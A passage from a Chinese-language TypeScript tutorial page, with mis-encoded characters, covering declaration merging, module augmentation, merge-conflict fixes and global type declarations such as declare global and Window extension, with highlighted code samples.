class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">types/<br>  â”œâ”€â”€ lib/<br>  â”‚   â”œâ”€â”€ base.d.ts      // åŸºç¡€å£°æ˜<br>  â”‚   â””â”€â”€ extensions/    // æ‰©å±•å£°æ˜<br>  â”‚       â”œâ”€â”€ v1.d.ts<br>  â”‚       â””â”€â”€ v2.d.ts<br>  â””â”€â”€ global.d.ts        // å…¨å±€åˆå¹¶<br></code></pre></td></tr></table></figure><ol start="2"><li>ç‰ˆæœ¬åŒ–åˆå¹¶ç­–ç•¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ¡ä»¶åˆå¹¶</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">LibVersion</span> = <span class="hljs-string">&#x27;v1&#x27;</span> | <span class="hljs-string">&#x27;v2&#x27;</span>;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;versioned-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Api</span> &#123;<br>    <span class="hljs-title function_">commonMethod</span>(): <span class="hljs-built_in">void</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;versioned-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Api</span> &#123;<br>    [<span class="hljs-title class_">LibVersion</span> <span class="hljs-keyword">extends</span> <span class="hljs-string">&#x27;v2&#x27;</span> ? <span class="hljs-string">&#x27;newMethod&#x27;</span> : <span class="hljs-built_in">never</span>]?: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>å®‰å…¨è¦†ç›–æ¨¡å¼ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;sensitive-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> __OriginalConfig &#123;<br>    <span class="hljs-comment">// ä¿ç•™åŸå§‹å®šä¹‰</span><br>    <span class="hljs-attr">originalProp</span>: <span class="hljs-built_in">string</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> <span class="hljs-keyword">extends</span> __OriginalConfig &#123;<br>    <span class="hljs-comment">// å®‰å…¨æ‰©å±•</span><br>    <span class="hljs-attr">customProp</span>?: <span class="hljs-built_in">number</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>React ç»„ä»¶åˆå¹¶æ¡ˆä¾‹</strong></p><ol><li>ç»„ä»¶å±æ€§åˆå¹¶ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå§‹ç»„ä»¶å£°æ˜</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;react-ui&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ButtonProps</span> &#123;<br>    <span class="hljs-attr">variant</span>: <span class="hljs-string">&#x27;primary&#x27;</span> | <span class="hljs-string">&#x27;secondary&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params"><span class="hljs-attr">props</span>: <span class="hljs-title class_">ButtonProps</span></span>): <span class="hljs-variable constant_">JSX</span>.<span class="hljs-property">Element</span>;<br>&#125;<br><br><span class="hljs-comment">// æ‰©å±•å±æ€§</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;react-ui&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ButtonProps</span> &#123;<br>    <span class="hljs-attr">size</span>?: <span class="hljs-string">&#x27;sm&#x27;</span> | <span class="hljs-string">&#x27;md&#x27;</span> | <span class="hljs-string">&#x27;lg&#x27;</span>; <span class="hljs-comment">// æ·»åŠ æ–°å±æ€§</span><br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br>&lt;<span class="hljs-title class_">Button</span> variant=<span class="hljs-string">&quot;primary&quot;</span> size=<span class="hljs-string">&quot;md&quot;</span> /&gt;; <span class="hljs-comment">// âœ…</span><br></code></pre></td></tr></table></figure><ol start="2"><li>Hooks è¿”å›å€¼åˆå¹¶ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå§‹Hook</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;react-hooks&#x27;</span> &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">useData</span>(<span class="hljs-params"></span>): &#123; <span class="hljs-attr">loading</span>: <span class="hljs-built_in">boolean</span>; <span class="hljs-attr">data</span>: <span class="hljs-built_in">any</span> &#125;;<br>&#125;<br><br><span class="hljs-comment">// æ‰©å±•è¿”å›å€¼</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;react-hooks&#x27;</span> &#123;<br>  <span class="hljs-keyword">function</span> useData&lt;T&gt;(): &#123; <span class="hljs-attr">loading</span>: <span class="hljs-built_in">boolean</span>; <span class="hljs-attr">data</span>: T | <span class="hljs-literal">null</span>; <span class="hljs-attr">error</span>?: <span class="hljs-title class_">Error</span> &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åˆå¹¶å†²çªè§£å†³æ–¹æ¡ˆ</strong></p><p>å†²çªç±»å‹ 1ï¼šå±æ€§ç±»å‹ä¸å…¼å®¹</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å£°æ˜1</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>  <span class="hljs-attr">logLevel</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-comment">// å£°æ˜2</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>  <span class="hljs-attr">logLevel</span>: <span class="hljs-string">&#x27;debug&#x27;</span> | <span class="hljs-string">&#x27;info&#x27;</span>; <span class="hljs-comment">// ğŸš« ç±»å‹å†²çª</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ–¹æ³•1ï¼šä½¿ç”¨è”åˆç±»å‹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>  <span class="hljs-attr">logLevel</span>: <span class="hljs-built_in">string</span> | <span class="hljs-string">&#x27;debug&#x27;</span> | <span class="hljs-string">&#x27;info&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// æ–¹æ³•2ï¼šç‰ˆæœ¬åŒ–å£°æ˜</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">__configVersion</span>: <span class="hljs-string">&#x27;v1&#x27;</span> | <span class="hljs-string">&#x27;v2&#x27;</span>;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>  <span class="hljs-attr">logLevel</span>: __configVersion <span class="hljs-keyword">extends</span> <span class="hljs-string">&#x27;v2&#x27;</span> ? <span class="hljs-string">&#x27;debug&#x27;</span> | <span class="hljs-string">&#x27;info&#x27;</span> : <span class="hljs-built_in">string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†²çªç±»å‹ 2ï¼šå‡½æ•°é‡è½½æ­§ä¹‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">any</span>;<br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">object</span>; <span class="hljs-comment">// ğŸš« ç›¸åŒå‚æ•°ç±»å‹</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ˜ç¡®é‡è½½é¡ºåº</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">any</span>;<br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">object</span></span>): <span class="hljs-built_in">object</span>; <span class="hljs-comment">// âœ… ä¸åŒå‚æ•°ç±»å‹</span><br></code></pre></td></tr></table></figure><p><strong>å£°æ˜åˆå¹¶å‚è€ƒè¡¨</strong></p><table><thead><tr><th align="left">åˆå¹¶åœºæ™¯</th><th align="left">æ¨èç­–ç•¥</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">æ¥å£å±æ€§æ‰©å±•</td><td align="left">ç›´æ¥æ·»åŠ æ–°å±æ€§</td><td align="left"><code>interface &#123; newProp: type &#125;</code></td></tr><tr><td align="left">å‡½æ•°é‡è½½æ‰©å±•</td><td align="left">æ·»åŠ ä¸åŒå‚æ•°ç±»å‹çš„é‡è½½</td><td align="left"><code>function parse(data: object)</code></td></tr><tr><td align="left">æ³›å‹çº¦æŸå¢å¼º</td><td align="left">ä½¿ç”¨æ¡ä»¶ç±»å‹ç»§æ‰¿</td><td align="left"><code>Store&lt;T extends object&gt;</code></td></tr><tr><td align="left">è·¨æ¨¡å—ç±»å‹åˆå¹¶</td><td align="left">ä½¿ç”¨ç±»å‹æŸ¥è¯¢å’Œç»„åˆ</td><td align="left"><code>type Full = LibA.Type &amp; LibB.Type</code></td></tr><tr><td align="left">ç‰ˆæœ¬å·®å¼‚åŒ–åˆå¹¶</td><td align="left">æ¡ä»¶ç±»å‹ + ç¯å¢ƒå˜é‡</td><td align="left"><code>__version extends &#39;v2&#39; ? ...</code></td></tr><tr><td align="left">ç¬¬ä¸‰æ–¹åº“è¡¥ä¸</td><td align="left">æ¨¡å—å£°æ˜åˆå¹¶ + é˜²å¾¡æ€§æ£€æŸ¥</td><td align="left"><code>declare module &#39;lib&#39; &#123; ... &#125;</code></td></tr></tbody></table><h3 id="3-2-3-å…¨å±€å˜é‡ç±»å‹å®šä¹‰"><a href="#3-2-3-å…¨å±€å˜é‡ç±»å‹å®šä¹‰" class="headerlink" title="3.2.3 å…¨å±€å˜é‡ç±»å‹å®šä¹‰"></a>3.2.3 å…¨å±€å˜é‡ç±»å‹å®šä¹‰</h3><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong></p><p>å…¨å±€å˜é‡ï¼šåœ¨æ¨¡å—ç³»ç»Ÿå¤–å¯ç›´æ¥è®¿é—®çš„å˜é‡ï¼ˆå¦‚ window å¯¹è±¡å±æ€§ã€CDN å¼•å…¥çš„åº“ï¼‰</p><p>å®šä¹‰ç›®æ ‡ï¼š</p><ul><li>ä¸ºéæ¨¡å—åŒ–è„šæœ¬æä¾›ç±»å‹æ”¯æŒ</li><li>æ‰©å±•å…¨å±€å‘½åç©ºé—´ï¼ˆå¦‚ windowã€globalï¼‰</li><li>é¿å… Cannot find name â€˜xxxâ€™ ç±»å‹é”™è¯¯</li></ul><p><strong>ä»£ç ç¤ºä¾‹</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// â­ åœºæ™¯1ï¼šå£°æ˜å…¨å±€å˜é‡ (å£°æ˜æ–‡ä»¶.d.ts)</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">VERSION</span>: <span class="hljs-built_in">string</span>;  <span class="hljs-comment">// ç¼–è¯‘æ—¶æ³¨å…¥çš„ç‰ˆæœ¬å·</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">trackEvent</span>(<span class="hljs-params"><span class="hljs-attr">eventName</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">payload</span>: <span class="hljs-built_in">object</span></span>): <span class="hljs-built_in">void</span>;  <span class="hljs-comment">// å…¨å±€åŸ‹ç‚¹å‡½æ•°</span><br><br><span class="hljs-comment">// â­ åœºæ™¯2ï¼šæ‰©å±•å…¨å±€å¯¹è±¡ (å¦‚ Window æ¥å£)</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Window</span> &#123;<br>  <span class="hljs-attr">_env</span>: &#123;<br>    <span class="hljs-attr">API_HOST</span>: <span class="hljs-built_in">string</span>;<br>    <span class="hljs-attr">DEBUG_MODE</span>: <span class="hljs-built_in">boolean</span>;<br>  &#125;;<br>  <span class="hljs-attr">ga</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">command</span>: <span class="hljs-built_in">string</span>, ...<span class="hljs-attr">args</span>: <span class="hljs-built_in">unknown</span>[]</span>) =&gt;</span> <span class="hljs-built_in">void</span>;  <span class="hljs-comment">// Google Analytics</span><br>&#125;<br><br><span class="hljs-comment">// â­ åœºæ™¯3ï¼šæ¨¡å—åŒ–ç¯å¢ƒä¸­çš„å…¨å±€å£°æ˜ (ä½¿ç”¨ declare global)</span><br><span class="hljs-keyword">export</span> &#123;&#125;;  <span class="hljs-comment">// ç¡®ä¿æ–‡ä»¶æ˜¯æ¨¡å—ç¯å¢ƒ</span><br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">global</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Array</span>&lt;T&gt; &#123;<br>    <span class="hljs-title function_">findLast</span>(<span class="hljs-attr">predicate</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">value</span>: T</span>) =&gt;</span> <span class="hljs-built_in">boolean</span>): T | <span class="hljs-literal">undefined</span>;  <span class="hljs-comment">// æ‰©å±•åŸç”ŸArray</span><br>  &#125;<br>  <br>  <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">NodeJS</span> &#123;<br>    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProcessEnv</span> &#123;<br>      <span class="hljs-attr">NODE_ENV</span>: <span class="hljs-string">&#x27;development&#x27;</span> | <span class="hljs-string">&#x27;production&#x27;</span>;<br>      <span class="hljs-attr">SSR_ENABLED</span>: <span class="hljs-built_in">boolean</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µä¸é™·é˜±</strong></p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">è§£å†³æ–¹æ¡ˆ</th><th align="left">æ³¨æ„äº‹é¡¹</th></tr></thead><tbody><tr><td align="left">CDN å¼•å…¥çš„åº“</td><td align="left"><code>declare const jQuery: any;</code></td><td align="left">ä¼˜å…ˆå®‰è£… @types åŒ…</td></tr><tr><td align="left">æ³¨å…¥çš„è¿è¡Œæ—¶å˜é‡</td><td align="left"><code>declare const __INITIAL_STATE__: AppState;</code></td><td align="left">éœ€ä¸æ„å»ºè„šæœ¬é…åˆæ³¨å…¥</td></tr><tr><td align="left">æ‰©å±•æµè§ˆå™¨åŸç”Ÿå¯¹è±¡</td><td align="left">é€šè¿‡ interface åˆå¹¶å£°æ˜</td><td align="left">é¿å…è¦†ç›–æ ‡å‡†ç±»å‹å®šä¹‰</td></tr><tr><td align="left">å¤šç¯å¢ƒå…¨å±€å˜é‡</td><td align="left">ä½¿ç”¨ .d.ts + æ¡ä»¶ç±»å‹</td><td align="left">åŒºåˆ† process.env å’Œ import.meta.env</td></tr></tbody></table><p>å…¸å‹é”™è¯¯æ¡ˆä¾‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šç›´æ¥è¦†ç›–Windowç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Window</span> = <span class="hljs-title class_">CustomWindow</span>;  <br><br><span class="hljs-comment">// âœ… æ­£ç¡®ï¼šé€šè¿‡æ¥å£åˆå¹¶</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Window</span> &#123;<br>  <span class="hljs-attr">customProp</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•çº§è€ƒç‚¹</strong></p><ul><li>ç±»å‹åˆå¹¶æœºåˆ¶ï¼šæ¥å£å£°æ˜åˆå¹¶ vs å‘½åç©ºé—´åˆå¹¶</li><li>æ¨¡å—åŒ–å½±å“ï¼š<ul><li>å…¨å±€å£°æ˜å¿…é¡»æ”¾åœ¨ .d.ts æ–‡ä»¶æˆ–ä½¿ç”¨ declare global</li><li>åŒ…å« import&#x2F;export çš„æ–‡ä»¶ä¼šè¢«è§†ä¸ºæ¨¡å—</li></ul></li><li>ç±»å‹å¯è§æ€§è§„åˆ™ï¼š</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// types.d.ts</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">GlobalType</span> &#123; <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span> &#125;  <span class="hljs-comment">// å…¨å±€å¯è§</span><br><br><span class="hljs-comment">// utils.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">declare</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">LocalType</span> &#123;&#125;  <span class="hljs-comment">// ä»…æ¨¡å—å†…å¯è§</span><br></code></pre></td></tr></table></figure><ul><li>ä¸ window as any çš„å–èˆï¼šä¼˜å…ˆå£°æ˜å…·ä½“ç±»å‹ä¿è¯å®‰å…¨</li></ul><h3 id="3-2-4-å¤æ‚ç±»å‹å£°æ˜æœ€ä½³å®è·µ"><a href="#3-2-4-å¤æ‚ç±»å‹å£°æ˜æœ€ä½³å®è·µ" class="headerlink" title="3.2.4 å¤æ‚ç±»å‹å£°æ˜æœ€ä½³å®è·µ"></a>3.2.4 å¤æ‚ç±»å‹å£°æ˜æœ€ä½³å®è·µ</h3><p><strong>æ ¸å¿ƒè®¾è®¡åŸåˆ™</strong></p><table><thead><tr><th align="left">åŸåˆ™</th><th align="left">è¯´æ˜</th><th align="left">åæ¨¡å¼æ¡ˆä¾‹</th></tr></thead><tbody><tr><td align="left">ç²¾ç¡®æ€§</td><td align="left">ç±»å‹åº”ä¸¥æ ¼åŒ¹é…è¿è¡Œæ—¶è¡Œä¸º</td><td align="left">ç”¨ any ä»£æ›¿å…·ä½“ç»“æ„</td></tr><tr><td align="left">å¯è¯»æ€§</td><td align="left">é€šè¿‡ç±»å‹åˆ«ååˆ†å±‚æŠ½è±¡</td><td align="left">åµŒå¥—è¶…è¿‡ä¸‰å±‚çš„åŒ¿åç±»å‹</td></tr><tr><td align="left">å…¼å®¹æ€§</td><td align="left">è€ƒè™‘æ—§ç‰ˆ TypeScript çš„è§£æèƒ½åŠ›</td><td align="left">ä½¿ç”¨ TS 4.1+ ç‰¹æ€§ä½†æœªé™çº§</td></tr><tr><td align="left">å¯æ‰©å±•æ€§</td><td align="left">é¢„ç•™æ‰©å±•ç‚¹ï¼ˆå¦‚ç´¢å¼•ç­¾åï¼‰</td><td align="left">å®Œå…¨å°é—­çš„ç±»å‹å®šä¹‰</td></tr></tbody></table><p><strong>å¤æ‚ç±»å‹å£°æ˜æ¨¡å¼</strong></p><p>åœºæ™¯1ï¼šæ·±åº¦åµŒå¥—ç»“æ„ï¼ˆå¦‚ API å“åº”ï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨æ¥å£åˆ†å±‚ + ç±»å‹åˆ«åç»„åˆ</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserProfile</span> &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">contacts</span>: &#123;<br>    <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;<br>    <span class="hljs-attr">social</span>?: &#123; <span class="hljs-comment">// å¯é€‰åµŒå¥—</span><br>      <span class="hljs-attr">wechat</span>: <span class="hljs-built_in">string</span>;<br>      <span class="hljs-attr">alipay</span>: <span class="hljs-built_in">string</span>;<br>    &#125;;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// æå–å…¬å…±ç»“æ„</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Pagination</span>&lt;T&gt; = &#123;<br>  <span class="hljs-attr">current_page</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">data</span>: T[];<br>&#125;;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUserList</span>(<span class="hljs-params"></span>): <span class="hljs-title class_">Pagination</span>&lt;<span class="hljs-title class_">UserProfile</span>&gt;;<br></code></pre></td></tr></table></figure><p>åœºæ™¯2ï¼šåŠ¨æ€é”®åå¯¹è±¡ï¼ˆå¦‚å›½é™…åŒ–å­—å…¸ï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ¨¡æ¿å­—é¢é‡ç±»å‹ + ç´¢å¼•ç­¾å</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Locale</span> = <span class="hljs-string">&#x27;zh-CN&#x27;</span> | <span class="hljs-string">&#x27;en-US&#x27;</span>;<br><span class="hljs-keyword">type</span> I18nKeys = <span class="hljs-string">`button.<span class="hljs-subst">$&#123;<span class="hljs-string">&#x27;submit&#x27;</span> | <span class="hljs-string">&#x27;cancel&#x27;</span>&#125;</span>`</span> | <span class="hljs-string">`title.<span class="hljs-subst">$&#123;<span class="hljs-string">&#x27;home&#x27;</span> | <span class="hljs-string">&#x27;about&#x27;</span>&#125;</span>`</span>;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">i18n</span>: &#123;<br>  [key <span class="hljs-keyword">in</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;Locale&#125;</span>/<span class="hljs-subst">$&#123;I18nKeys&#125;</span>`</span>]: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// å¦‚ &quot;zh-CN/button.submit&quot;</span><br>&#125; &amp; &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-attr">key</span>: <span class="hljs-string">`<span class="hljs-subst">$&#123;Locale&#125;</span>/<span class="hljs-subst">$&#123;I18nKeys&#125;</span>`</span>, <span class="hljs-attr">vars</span>?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;): <span class="hljs-built_in">string</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœºæ™¯3ï¼šå‡½æ•°é‡è½½ç±»å‹ï¼ˆå¦‚ SDK æ–¹æ³•ï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨è”åˆç±»å‹ + æ¡ä»¶ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">SDKOptions</span> = <br>  | &#123; <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;sync&#x27;</span>; <span class="hljs-attr">timeout</span>: <span class="hljs-built_in">number</span> &#125;<br>  | &#123; <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;async&#x27;</span>; <span class="hljs-attr">callback</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">res</span>: <span class="hljs-title class_">Response</span></span>) =&gt;</span> <span class="hljs-built_in">void</span> &#125;;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">invokeAPI</span>(<span class="hljs-params"></span><br><span class="hljs-params">  <span class="hljs-attr">endpoint</span>: <span class="hljs-string">&#x27;/user&#x27;</span>,</span><br><span class="hljs-params">  <span class="hljs-attr">options</span>?: <span class="hljs-title class_">SDKOptions</span></span><br><span class="hljs-params"></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">User</span>&gt; | <span class="hljs-title class_">User</span>;<br></code></pre></td></tr></table></figure><p><strong>è¿›é˜¶æŠ€å·§ä¸é™·é˜±è§„é¿</strong></p><p>æŠ€å·§1ï¼šç±»å‹é€’å½’æ·±åº¦æ§åˆ¶</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// âœ… å®‰å…¨é€’å½’ï¼šé™åˆ¶æ·±åº¦</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">MaxDepth</span>&lt;T, D <span class="hljs-keyword">extends</span> <span class="hljs-built_in">number</span> = <span class="hljs-number">3</span>&gt; = <br>  D <span class="hljs-keyword">extends</span> <span class="hljs-number">0</span> ? <span 